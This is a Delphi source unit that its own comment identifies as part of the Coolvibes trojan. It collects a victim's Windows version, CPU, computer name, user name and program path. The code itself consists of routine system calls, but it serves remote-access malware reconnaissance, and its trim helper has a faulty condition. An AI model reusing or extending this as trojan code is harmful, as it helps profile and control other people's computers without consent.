{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
relaccionadas con la obtención de información del sistema remoto}
unit UnitSystemInfo;

interface

uses
  Windows,
  sysutils,
  UnitFunciones;

  function GetOS(): String;
  function GetCPU():String;
  function fGetComputerName():String;
  function fGetUserName(): String;
  function GetSvrPath(): String;

implementation

function sTrim(lpStr:String):String;
var
i: Integer;
nTemp: Integer;
nTemp2: Integer;
begin
If Length(lpStr) > 0 Then
begin
     for i := 1 to Length(lpStr)  do
     begin
         If (lpStr[i] <> ' ') or (lpStr[i] <> chr(0)) Then
         begin
              nTemp := i;
              break;
         end;
     end;

     for i := Length(lpStr) downto 1 do
     begin
         If (lpStr[i] <> ' ') or (lpStr[i]<>chr(0)) Then
         begin
            nTemp2:=i;
            break;
         end;
     end;

     for i := nTemp to nTemp2 do
     begin
         Result:=Result + lpStr[i]
     end;
end;
end;

function IntToStr(Num: Integer):String;
var x:string;
begin
     System.Str(Num,x);
     result:=x;
end;

function GetOS(): String;
var
  osVerInfo: TOSVersionInfo;
begin
  Result:='Desconocido';
  osVerInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
  GetVersionEx(osVerInfo);
  case osVerInfo.dwPlatformId of
    VER_PLATFORM_WIN32_NT: begin
      case osVerInfo.dwMajorVersion of
        4: Result:='Windows NT 4.0';
        5: case osVerInfo.dwMinorVersion of
             0: Result:='Windows 2000';
             1: Result:='Windows XP';
             2: Result:='Windows Server 2003';
           end;
        6: Result:='Windows Vista';
        7: Result:='Windows 7'
      end;
    end;
    VER_PLATFORM_WIN32_WINDOWS: begin
      case osVerInfo.dwMinorVersion of
        0: Result:='Windows 95';
       10: Result:='Windows 98';
       90: Result:='Windows Me';
      end;
    end;
  end;
end;

function GetCPU():String;
begin
  //Trim quita los espacios antes y despues de la cadena, ejem "    CPU p6 2000  " , con trim "CPU p6 2000"
  Result := Trim(GetClave(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString'));
end;

function fGetComputerName():String;
var
lpBuffer: String;
nSize: Cardinal;
begin
     SetLength(lpBuffer,MAX_COMPUTERNAME_LENGTH + 1);
     nSize:= Length(lpBuffer);
     GetComputerName(PChar(lpBuffer),nSize);
     lpBuffer:= Trim(lpBuffer);
     Result:= lpBuffer;
end;

function fGetUserName(): String;
var
lpBuffer: array [0..MAX_PATH] of char;
nSize: Cardinal;
begin
     nSize:= SizeOf(lpBuffer);
     GetUserName(lpBuffer,nSize);
     Result:= Trim(lpBuffer);
end;

function GetSvrPath(): String;
var
lpBuffer: Array [0..MAX_PATH]of char;
begin
     GetModuleFileName(0,lpBuffer,MAX_PATH);
     Result:= Trim(lpBuffer)
end;

end.
